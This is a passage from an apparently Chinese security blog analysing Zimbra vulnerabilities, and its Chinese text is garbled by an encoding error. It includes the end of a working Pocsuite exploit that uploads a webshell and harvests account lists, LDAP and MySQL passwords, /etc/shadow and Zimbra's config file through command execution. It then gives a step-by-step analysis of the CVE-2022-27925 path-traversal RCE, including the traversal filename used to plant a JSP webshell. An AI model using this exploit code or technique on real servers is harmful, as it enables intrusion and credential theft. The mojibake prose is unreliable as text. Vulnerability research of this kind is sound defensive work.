urlparse(self.url).hostname</span><br><span class="line">        self.port = urlparse(self.url).port</span><br><span class="line">        <span class="keyword">if</span> self.port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port = <span class="number">443</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.check_Vulnerable():</span><br><span class="line">                self.upload_webshell()</span><br><span class="line">                result[<span class="string">&quot;url&quot;</span>] = self.url+<span class="string">&#x27;/zimbraAdmin&#x27;</span></span><br><span class="line">                <span class="comment"># Webç½‘ç«™ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">                result[<span class="string">&quot;web&quot;</span>] = &#123;</span><br><span class="line">                    <span class="comment"># ç½‘ç«™é»˜è®¤é¦–é¡µçš„titleä¿¡æ¯ï¼ˆå¯èƒ½å«æœ‰å•ä½æˆ–ç»„ç»‡ä¿¡æ¯ï¼‰</span></span><br><span class="line">                    <span class="string">&quot;title&quot;</span>: self.get_title(),</span><br><span class="line">                    <span class="comment">#æ‰€æœ‰è´¦æˆ·ä¿¡æ¯</span></span><br><span class="line">                    <span class="string">&quot;users&quot;</span>: self.GetAllAccountsRequest()</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment"># å‡­æ®ç±»ä¿¡æ¯ï¼Œé’ˆå¯¹å„ç±»å¼±å£ä»¤ã€é»˜è®¤å£ä»¤æ¼æ´</span></span><br><span class="line">                ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass = self.get_ldap_and_mysql_Info()</span><br><span class="line">                result[<span class="string">&quot;login_credentials&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: ldap_user, <span class="string">&quot;password&quot;</span>: ldap_Pass,<span class="string">&quot;ldap_url&quot;</span>: ldap_url, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;ldap&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: mysql_username, <span class="string">&quot;password&quot;</span>: mysql_Pass, <span class="string">&quot;mysql_bind_address&quot;</span>: mysql_address, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;mysql&quot;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># è·å–çš„æ–‡ä»¶ä¿¡æ¯, é’ˆå¯¹å„ç±»æ–‡ä»¶è¯»å–ç±»æ¼æ´</span></span><br><span class="line">                result[<span class="string">&quot;files&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/passwd&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/hosts&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/hosts&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/shadow&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/shadow&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;resolv,conf&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/resolv.conf&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/resolv.conf&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;localconfig.xml&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/opt/zimbra/conf/localconfig.xml&quot;</span>,<span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /opt/zimbra/conf/localconfig.xml&quot;</span>)&#125;,</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># å‘½ä»¤æ‰§è¡Œä¿¡æ¯, é’ˆå¯¹å„ç±»å‘½ä»¤æ‰§è¡Œã€ä»£ç æ‰§è¡Œæ¼æ´</span></span><br><span class="line">                result[<span class="string">&quot;commands&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;id&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;whoami&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;arp&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;arp -a&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;ifconfig&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;ifconfig&quot;</span>)&#125;</span><br><span class="line">                ]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result.keys()) != <span class="number">0</span>:</span><br><span class="line">            json_result = &#123;</span><br><span class="line">                <span class="string">&quot;result&quot;</span>: &#123;<span class="string">&quot;json&quot;</span>: json.dumps(result)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            output.success(json_result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(PoC)</span><br></pre></td></tr></table></figure><p>POCè¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bec6e6ea21b9a9e439f60.jpg" title="b4f07362-1c0b-44f2-ab17-b6cc8365da1f" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec6e6ea21b9a9e439f60.jpg" alt="b4f07362-1c0b-44f2-ab17-b6cc8365da1f"></a></p><h2 id="CVE-2022-27925-Zimbraè·¯å¾„ç©¿è¶Šå¯¼è‡´çš„RCEæ¼æ´"><a href="#CVE-2022-27925-Zimbraè·¯å¾„ç©¿è¶Šå¯¼è‡´çš„RCEæ¼æ´" class="headerlink" title="CVE-2022-27925 Zimbraè·¯å¾„ç©¿è¶Šå¯¼è‡´çš„RCEæ¼æ´"></a>CVE-2022-27925 Zimbraè·¯å¾„ç©¿è¶Šå¯¼è‡´çš„RCEæ¼æ´</h2><h3 id="æ¼æ´åŸç†-1"><a href="#æ¼æ´åŸç†-1" class="headerlink" title="æ¼æ´åŸç†"></a><strong>æ¼æ´åŸç†</strong></h3><h4 id="è°ƒè¯•è®¾ç½®"><a href="#è°ƒè¯•è®¾ç½®" class="headerlink" title="è°ƒè¯•è®¾ç½®"></a><strong>è°ƒè¯•è®¾ç½®</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">su zimbra</span><br><span class="line">zmcontrol stop</span><br><span class="line">su</span><br><span class="line"><span class="built_in">cp</span> /opt/zimbra/libexec/zmmailboxdmgr /opt/zimbra/libexec/zmmailboxdmgr.old</span><br><span class="line"><span class="built_in">cp</span> /opt/zimbra/libexec/zmmailboxdmgr.unrestricted /opt/zimbra/libexec/zmmailboxdmgr</span><br><span class="line">su zimbra</span><br><span class="line">zmlocalconfig -e mailboxd_java_options=<span class="string">&quot;`zmlocalconfig -m nokey mailboxd_java_options` -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005&quot;</span></span><br><span class="line">zmcontrol start</span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨IDEAå¯¼å…¥ä¾èµ–åº“å³å¯ã€‚</p><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a><strong>æ¼æ´åˆ†æ</strong></h4><p>æ¼æ´å‡ºç°åœ¨ <code>mboximport</code> ç›¸å…³çš„åŠŸèƒ½ä¸­ï¼Œå…¨å±€æœç´¢å®šä½è‡³<code>com.zimbra.cs.service.backup.MailboxImportServlet</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bec8f6ea21b9a9e449541.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec8f6ea21b9a9e449541.jpg"></a></p><p>ç”±å…¶å‘½åè§„åˆ™å’Œå­˜åœ¨çš„æˆå‘˜å‡½æ•°æ¥çœ‹ï¼Œ<code>MailboxImportServlet</code>åº”è¯¥å¯¹åº”ä¸€ä¸ª<code>HttpServlet</code>å¯¹è±¡ï¼Œä½†æ˜¯<code>MailboxImportServlet</code>ç»§æ‰¿äº<code>com.zimbra.cs.extension.ExtensionHttpHandler</code> è€Œé <code>HttpServlet</code>ï¼Œå› æ­¤éœ€è¦æ‰¾åˆ°å¦‚ä½•é€šè¿‡URLå…³è”åˆ°æ­¤å¤„ã€‚</p><p>Zimbra è‡ªå®šä¹‰äº† <code>Servlet</code> å¯¹è±¡çš„åŸºç±» <code>ZimbraServlet</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642becaf6ea21b9a9e4589d9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becaf6ea21b9a9e4589d9.jpg"></a></p><p>æŸ¥çœ‹<code>ZimbraServlet</code>çš„å­ç±»ï¼š</p><p><a href="https://pic.imgdb.cn/item/642becbf6ea21b9a9e460504.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becbf6ea21b9a9e460504.jpg"></a></p><p>å®šä½è‡³<code>com.zimbra.cs.extension.ExtensionDispatcherServlet</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642beccb6ea21b9a9e465cee.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beccb6ea21b9a9e465cee.jpg"></a></p><p>åœ¨<code>webapps\service\WEB-INF\web.xml</code>ä¸­å¯ä»¥æ‰¾åˆ°ï¼š</p><p><a href="https://pic.imgdb.cn/item/642becd86ea21b9a9e46c6cd.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becd86ea21b9a9e46c6cd.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/642bece36ea21b9a9e472097.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bece36ea21b9a9e472097.jpg"></a></p><p>å› æ­¤<code>com.zimbra.cs.extension.ExtensionDispatcherServlet</code>å¯¹åº”çš„urlè§„åˆ™æ˜¯&#x2F;service&#x2F;extension&#x2F;*ï¼Œæ¥ç€åœ¨<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#service</code>ä¸­ï¼š</p><p><a href="https://pic.imgdb.cn/item/642becf36ea21b9a9e47982d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becf36ea21b9a9e47982d.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°handleræ˜¯ä¸€ä¸ª<code>ExtensionHttpHandler</code>å¯¹è±¡ï¼Œè€Œå‰é¢çš„ <code>MailboxImportServlet</code> æ­£å¥½ç»§æ‰¿äº <code>ExtensionHttpHandler</code>ã€‚è·Ÿè¿›<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#getHandler(javax.servlet.http.HttpServletRequest)</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bed016ea21b9a9e47f7f5.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed016ea21b9a9e47f7f5.jpg"></a></p><p>å°†urlä¸­çš„&#x2F;service&#x2F;extensionä¹‹åçš„å†…å®¹èµ‹å€¼ç»™extPathï¼Œè‹¥extPathçš„é•¿åº¦ä¸ä¸º0ï¼Œåˆ™æ‰§è¡ŒgetHandler(extPath)ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™handlerã€‚è·Ÿè¿›<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#getHandler(java.lang.String)</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bed196ea21b9a9e48b633.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed196ea21b9a9e48b633.jpg"></a></p><p>å…¶ä¸­sHandlersçš„å®šä¹‰åŠèµ‹å€¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/642bed7c6ea21b9a9e4baa1c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed7c6ea21b9a9e4baa1c.jpg"></a></p><p>sHandlersæ˜¯ä¸€ä¸ªMapç±»å‹çš„å¯¹è±¡ï¼Œåœ¨<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#register</code>ä¸­å¯¹sHandlersçš„é”®å€¼å¯¹è¿›è¡Œäº†æ“ä½œï¼Œå…¶ä¸­keyæ¥è‡ªhandler.getPath()ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bed896ea21b9a9e4c0eea.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed896ea21b9a9e4c0eea.jpg"></a></p><p><code>com.zimbra.cs.extension.ExtensionHttpHandler#getPath</code>ä¸­å­˜åœ¨<code>this.mExtension</code>ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå…¶åœ¨initæ–¹æ³•ä¸­è¿›è¡Œäº†å®šä¹‰ï¼Œå…¶ä¸­extæ˜¯ä¸€ä¸ª<code>ZimbraExtension</code>ç±»å‹çš„å¯¹è±¡ã€‚å®šä½åˆ°<code>ZimbraExtension</code>çš„å­ç±»<code>com.zimbra.cs.backup.BackupExtension</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bed956ea21b9a9e4c733b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed956ea21b9a9e4c733b.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°åœ¨æ­¤å¤„æ‰§è¡Œäº†<code>ExtensionDispatcherServlet</code>çš„registeræ–¹æ³•ï¼Œå¹¶ä¸”ä¼ å…¥çš„handleræ­£å¥½æ˜¯ä¸€ä¸ª<code>MailboxImportServlet</code>å®ä¾‹ã€‚é‚£ä¹ˆè¿›å…¥registerå‡½æ•°ï¼Œé¦–å…ˆæ‰§è¡Œ<code>handler.init(ext);</code>ï¼Œæ­¤æ—¶ï¼Œthis.mExtensionæ˜¯ä¸€ä¸ª<code>BackupExtension</code>å®ä¾‹ã€‚ä¹‹åæ‰§è¡Œ<code>String name = handler.getPath();</code>ï¼Œå› ä¸ºhandleræ˜¯ä¸€ä¸ª<code>MailboxImportServlet</code>å®ä¾‹ï¼Œ<code>MailboxImportServlet</code>çš„getPath()æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/642beda26ea21b9a9e4cde8c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beda26ea21b9a9e4cde8c.jpg"></a></p><p><code>com.zimbra.cs.extension.ExtensionHttpHandler</code>çš„getPath()æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/642bedae6ea21b9a9e4d4175.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedae6ea21b9a9e4d4175.jpg"></a></p><p>å› ä¸ºthis.mExtensionæ˜¯ä¸€ä¸ª<code>BackupExtension</code>å®ä¾‹ï¼Œè€ŒBackupExtensionçš„getName()æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/642bedbe6ea21b9a9e4db71d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedbe6ea21b9a9e4db71d.jpg"></a></p><p>å› æ­¤æœ€ånameçš„å€¼ä¸º&#x2F;backup&#x2F;mboximportï¼Œå› æ­¤sHandlersçš„ä¸€ä¸ªé”®å€¼å¯¹ä¸ºï¼š&#x2F;backup&#x2F;mboximport &#x3D;&gt; new MailboxImportServlet()ã€‚ä¹‹åç»è¿‡<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#getHandler(java.lang.String)</code>çš„æ‰§è¡Œï¼Œå°±ä¼šè¿”å›ä¸€ä¸ªMailboxImportServletå®ä¾‹ã€‚æ¥ç€ç»§ç»­å®¡è®¡<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#service</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bedca6ea21b9a9e4e112f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedca6ea21b9a9e4e112f.jpg"></a></p><p>æ ¹æ®ä¸Šé¢åˆ†æï¼Œé¦–å…ˆå¾—åˆ°ä¸€ä¸ªMailboxImportServletå®ä¾‹handlerï¼Œä¹‹åå¯¹è¯·æ±‚çš„æ–¹æ³•è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ˜¯POSTæ–¹æ³•ï¼Œåˆ™æ‰§è¡Œè¯¥MailboxImportServletå®ä¾‹çš„doPostæ–¹æ³•ã€‚åœ¨<code>com.zimbra.cs.service.backup.MailboxImportServlet#doPost</code>ä¸­ï¼Œé¦–å…ˆé€šè¿‡ <code>getAuthTokenFromCookie</code> ä» Cookie ä¸­æå– token è®¤è¯ä¿¡æ¯ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦ä¸ºç®¡ç†å‘˜æƒé™ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bedd86ea21b9a9e4e7a64.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedd86ea21b9a9e4e7a64.jpg"></a></p><p>è‹¥authTokenä¸ºç©ºæˆ–ä¸æ˜¯ç®¡ç†å‘˜ï¼Œåˆ™è¿”å›401çŠ¶æ€ç ä»¥åŠno authtoken cookieï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹æƒ…å†µï¼š</p><p><a href="https://pic.imgdb.cn/item/642bede36ea21b9a9e4ecdbd.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bede36ea21b9a9e4ecdbd.jpg"></a></p><p>æ¥ç€ä»£ç ç»§ç»­æ‰§è¡Œï¼š</p><p><a href="https://pic.imgdb.cn/item/642beded6ea21b9a9e4f1bd8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beded6ea21b9a9e4f1bd8.jpg"></a></p><p>è·å–account-nameã€account-statusä»¥åŠowå‚æ•°ã€‚æ¥ç€åˆ¤æ–­account-nameåŠowæ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ä¸ºç©ºï¼Œè¿›å…¥elseï¼š</p><p><a href="https://pic.imgdb.cn/item/642bedfc6ea21b9a9e4f9b58.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedfc6ea21b9a9e4f9b58.jpg"></a></p><p>è‹¥æˆ‘ä»¬ä¸ä¼ å…¥switch-onlã€no-switchä»¥åŠappendï¼Œé‚£ä¹ˆswitchOnlyã€noSwitchä»¥åŠappendçš„å€¼ä¸ºé»˜è®¤å€¼falseã€‚ä¹‹åè¿˜è·å–äº†accountï¼Œè‹¥ä¸ºç©ºï¼Œåˆ™ç›´æ¥è¿”å›ï¼Œç¨‹åºä¸­æ–­ã€‚å› æ­¤æˆ‘ä»¬ä¼ å…¥çš„account-nameå¿…é¡»æ˜¯ä¸€ä¸ªå­˜åœ¨çš„ç”¨æˆ·ã€‚</p><p>æ¥ç€æ‰§è¡Œä¹‹åçš„ä»£ç ï¼Œä¸ä¼ å…¥switch-onlå‚æ•°ï¼Œæ­¤æ—¶switchOnlyçš„å€¼ä¸ºfalseï¼Œè¿›å…¥å¦‚ä¸‹ifæ¡ä»¶ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bee216ea21b9a9e50f61f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee216ea21b9a9e50f61f.jpg"></a></p><p>åœ¨ç¬¬152è¡Œæ‰§è¡Œäº†importFrom()æ–¹æ³•ï¼Œå…¶ä¸­inä¸ºæˆ‘ä»¬POSTä¼ å…¥çš„å€¼ã€‚è·Ÿè¿›<code>com.zimbra.cs.service.backup.MailboxImportServlet#importFrom</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bee2f6ea21b9a9e519529.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee2f6ea21b9a9e519529.jpg"></a></p><p>sourceæ˜¯ä¸€ä¸ªZipBackupTargetå®ä¾‹ï¼Œæ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bee4f6ea21b9a9e529bc9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee4f6ea21b9a9e529bc9.jpg"></a></p><p>æ³¨æ„åˆ°<code>this.mTempDir = new File(path);</code>ï¼Œè·Ÿè¿›<code>com.zimbra.cs.account.ZAttrServer#getMailboxMoveTempDir</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bee6d6ea21b9a9e5387b3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee6d6ea21b9a9e5387b3.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°pathçš„å€¼é»˜è®¤ä¸º<code>/opt/zimbra/backup/tmp/mboxmove</code>ã€‚å› æ­¤mTempDiræ˜¯ä¸€ä¸ªFileå®ä¾‹ï¼Œä»£è¡¨<code>/opt/zimbra/backup/tmp/mboxmove</code>ç›®å½•ã€‚</p><p>ä¹‹åè·Ÿè¿›<code>com.zimbra.cs.backup.ZipBackupTarget#restore</code>æ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bee786ea21b9a9e53e0f8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee786ea21b9a9e53e0f8.jpg"></a></p><p>å†æ¬¡è·Ÿè¿›<code>com.zimbra.cs.backup.ZipBackupTarget#getAccountSession(java.lang.String)</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bee836ea21b9a9e543869.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee836ea21b9a9e543869.jpg"></a></p><p>è¿”å›ä¸€ä¸ªRestoreAcctSessionå®ä¾‹ï¼Œæ„é€ æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/642bee916ea21b9a9e54b6e2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee916ea21b9a9e54b6e2.jpg"></a></p><p>æ‰§è¡Œäº†<code>this.mTempDir = new File(ZipBackupTarget.this.getTempRoot(), accountId);</code>ï¼Œè·Ÿè¿›<code>com.zimbra.cs.backup.ZipBackupTarget#getTempRoot</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bee9e6ea21b9a9e557220.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee9e6ea21b9a9e557220.jpg"></a></p><p>è¿”å›çš„æ˜¯<code>this.mTempDir</code>ï¼Œå› æ­¤æ­¤æ—¶çš„this.mTempDirä»£è¡¨çš„æ˜¯<code>/opt/zimbra/backup/tmp/mboxmove/xxxxxxxxx</code>ç›®å½•ï¼Œå…¶ä¸­xxxxxxxxxä¸ºaccountIdã€‚ä¹‹åè·Ÿè¿›<code>com.zimbra.cs.backup.ZipBackupTarget.RestoreAcctSession#unzipToTempFiles</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642beea96ea21b9a9e55c60c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beea96ea21b9a9e55c60c.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°æ­¤å¤„å­˜åœ¨è·¯å¾„ç©¿è¶Šæ¼æ´ã€‚å‡è®¾æˆ‘ä»¬å°†å‹ç¼©åŒ…ä¸­æ–‡ä»¶çš„åå­—è®¾ä¸º<code>../1.txt</code>ï¼Œé‚£ä¹ˆfileå¯¹è±¡æŒ‡ä»£å¸¦çš„å°±æ˜¯<code>/opt/zimbra/backup/tmp/mboxmove/xxxxxxxxx/../1.txt</code>ï¼Œä¹Ÿå°±æ˜¯<code>/opt/zimbra/backup/tmp/mboxmove/1.txt</code>ã€‚ä¹‹åè·Ÿè¿›<code>com.zimbra.common.util.FileUtil#copy(java.io.InputStream, boolean, java.io.File)</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/642beeb76ea21b9a9e562ce9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beeb76ea21b9a9e562ce9.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°†æ–‡ä»¶å†…å®¹å†™å…¥åˆ°å¯¹åº”çš„æ–‡ä»¶ä¸­ã€‚å› æ­¤åˆ©ç”¨æ€è·¯å·²ç»å¾ˆæ˜äº†äº†ã€‚</p><p>æˆ‘ä»¬éœ€è¦ä»¥POSTæ–¹æ³•åœ¨<code>/service/extension/backup/mboximport?account-name=admin&amp;account-status=1&amp;ow=xxx</code>ä¸­ä¼ å…¥ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå…¶ä¸­å‹ç¼©åŒ…ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶åä¸º<code>../../../../mailboxd/webapps/zimbraAdmin/1.jsp</code>çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸ºæ™®é€šçš„webshell payloadå³å¯ï¼Œè¿™æ ·çš„è¯ä¸Šé¢æåˆ°çš„fileå¯¹è±¡æŒ‡ä»£å¸¦çš„å°±æ˜¯<code>/opt/zimbra/mailboxd/webapps/zimbraAdmin/1.jsp</code>ï¼Œç¨‹åºä¼šå°†webshell payloadå†™å…¥åˆ°<code>/opt/zimbra/mailboxd/webapps/zimbraAdmin/1.jsp</code>ä¸­ã€‚</p><h3 id="Pocsuite-POC-1"><a href="#Pocsuite-POC-1" class="headerlink" title="Pocsuite-POC"></a>Pocsuite-POC</h3><p>pocå¯ä»¥è·å–åˆ°ç®¡ç†å‘˜é‚®ç®±ã€ldapç”¨æˆ·å¯†ç ã€mysqlåœ°å€è´¦å·å¯†ç ä»¥åŠzimbraæ•æ„Ÿé…ç½®æ–‡ä»¶localconfig.xmlç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span 